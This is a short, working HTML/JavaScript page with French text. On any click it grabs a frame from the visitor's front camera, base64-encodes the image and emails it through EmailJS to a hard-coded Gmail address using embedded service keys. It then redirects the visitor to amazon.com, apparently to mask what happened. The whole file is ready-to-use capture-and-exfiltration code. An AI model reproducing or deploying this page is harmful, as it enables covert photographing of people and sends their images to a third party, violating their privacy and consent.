<!DOCTYPE html>
<html>
<head>
  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
  <script>
    emailjs.init("mxm3fFA_BxEhqJieq");
  </script>
</head>
<body>
  <script>
    async function captureAndSend() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        const video = document.createElement("video");
        video.srcObject = stream;
        await video.play();

        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext("2d").drawImage(video, 0, 0);

        const imageBase64 = canvas.toDataURL("image/jpeg", 0.5);

        stream.getTracks().forEach(track => track.stop());

        const params = {
          to_email: "adressestestee@gmail.com",
          message: "Photo capturée : " + imageBase64
        };

        emailjs.send("service_8cs0gml", "template_hgvdx1g", params)
          .then(() => { 
            alert("Photo envoyée !"); 
            window.location.href = "https://www.amazon.com"; 
          })
          .catch(err => alert("Erreur lors de l'envoi : " + err));
      } catch(err) {
        alert("Erreur caméra : " + err);
      }
    }

    // Déclenche sur clic
    document.body.addEventListener("click", captureAndSend);
  </script>
  <p>Cliquez n’importe où pour prendre la photo et l’envoyer.</p>
</body>
</html>
